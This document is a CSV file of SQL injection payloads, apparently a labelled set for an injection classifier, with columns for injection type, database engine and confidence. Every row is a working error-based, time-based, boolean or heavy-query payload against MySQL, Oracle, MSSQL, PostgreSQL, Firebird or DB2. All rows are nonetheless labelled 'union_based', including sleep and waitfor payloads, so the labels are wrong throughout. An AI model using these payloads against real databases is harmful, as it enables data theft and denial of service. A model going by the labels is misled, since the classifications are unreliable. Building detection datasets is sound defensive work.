id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
2153,"1' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'sdnc' = 'sdnc",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
2155,-8074' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'lnwm' = 'lnwm,union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
2156,"1"" where 2204 = 2204 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
2157,1' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
2158,"1"" where 9083 = 9083 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
2166,"-5996 ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
2170,"1"" ) ) as vigs where 6175 = 6175 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
2175,"1'+ ( select ounb where 4653 = 4653 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
2176,"-9772' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'igaa' = 'igaa",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
2178,"1 ) ) as zdbj where 2300 = 2300 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
2184,1' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'mmow' = 'mmow,union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
2189,-3378' ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'otbq' = 'otbq,union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
2190,"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
2010,select ( case when ( 3344 = 8103 ) then 3344 else 1/ ( select 0 ) end ) --,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 74 chars.,0
2018,1'|| ( select 'blvu' from dual where 9813 = 9813,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
2045,1'|| ( select 'xdzp' from dual where 5786 = 5786 and ( 3020 = 3020 ) *6703 ) ||',union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
2047,select sleep ( 5 ) and ( ( ( '%' = ',union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
2048,1'+ ( select 'dkxk' where 1241 = 1241 waitfor delay '0:0:5'--,union_based,mssql,0.9,Signals: 'waitfor'; UNION-based payload detected; DB: mssql,0
2065,select ( case when ( 4690 = 4373 ) then 4690 else 1/ ( select 0 ) end ) --,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 74 chars.,0
2069,select sleep ( 5 ) and 'eskp' like 'eskp,union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
2079,"select * from generate_series ( 2317,2317,case when ( 2317 = 9706 ) then 1 else 0 end ) limit 1--",union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 97 chars.,0
2080,"select * from generate_series ( 3427,3427,case when ( 3427 = 7516 ) then 1 else 0 end ) limit 1--",union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 97 chars.,0
2085,select case when 7649 = 9297 then 1 else null end--,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 51 chars.,0
2093,"1' ) ) as kwre where 7775 = 7775 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
2094,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 'qhgp' = 'qhgp",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
2099,1'|| ( select 'eyiy' from dual where 8127 = 8127,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
2100,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 'vfxg' like 'vfxg",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
2115,"1' ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
2117,select ( case when ( 5698 = 3453 ) then 5698 else 1/ ( select 0 ) end ) --,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 74 chars.,0
2128,if ( 6745 = 4078 ) select 6745 else drop function ytyt--,union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,0
2167,1'|| ( select 'mlwj' from dual where 4247 = 4247 and 1702 = 8469 ) ||',union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
2183,1'|| ( select 'dajl' from dual where 8440 = 8440,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
2188,"1"" ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
2006,"1 ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 71 chars.,0
2009,"1"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""ubxw"" like ""ubxw",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 100 chars.,0
2067,"1 ) ) as xsyk where 2575 = 2575 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 102 chars.,0
2070,"1"" ) as advz where 5166 = 5166 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 101 chars.,0
2072,"1%"" or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 163 chars.,0
2083,"select count ( * ) from generate_series ( 1,5000000 ) and ""%"" = """,union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 65 chars.,0
2090,1'+ ( select iwbs where 4939 = 4939,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,0
2096,"1"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 113 chars.,0
2097,"1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",union_based,generic,0.7,UNION-based payload detected. Payload length: 158 chars.,0
2101,"1%' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( '%' = '",union_based,generic,0.7,UNION-based payload detected. Payload length: 123 chars.,0
2102,"1'+ ( select 'opqr' where 2442 = 2442 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 143 chars.,0
2110,"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 109 chars.,0
2123,1'+ ( select 'czpg' where 6627 = 6627 and 2006 = 2006,union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,0
2124,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( ""%"" = """,union_based,generic,0.7,UNION-based payload detected. Payload length: 103 chars.,0
2131,"1"" ) as tecq where 4817 = 4817 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 141 chars.,0
2137,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ||'",union_based,generic,0.7,UNION-based payload detected. Payload length: 91 chars.,0
2142,"1 ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",union_based,generic,0.7,UNION-based payload detected. Payload length: 107 chars.,0
2148,"1' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'gucd' = 'gucd",union_based,generic,0.7,UNION-based payload detected. Payload length: 190 chars.,0
2150,"1"" ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 110 chars.,0
2152,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ""ihqf"" = ""ihqf",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 113 chars.,0
2161,"1"" ) where 4660 = 4660 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 128 chars.,0
2163,"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",union_based,generic,0.7,UNION-based payload detected. Payload length: 104 chars.,0
2165,"1"" ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""tzog"" like ""tzog",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 136 chars.,0
2169,"( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,0
2171,1'+ ( select 'dpun' where 4760 = 4760,union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,0
2173,"1"" ) as pydh where 3407 = 3407 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 191 chars.,0
2179,"1"" ) ) as ogzn where 6849 = 6849 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 136 chars.,0
2182,"1"" ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""vypw"" like ""vypw",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 139 chars.,0
2197,"1"" ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""vnso"" like ""vnso",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 135 chars.,0
2199,"1%"" ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 109 chars.,0
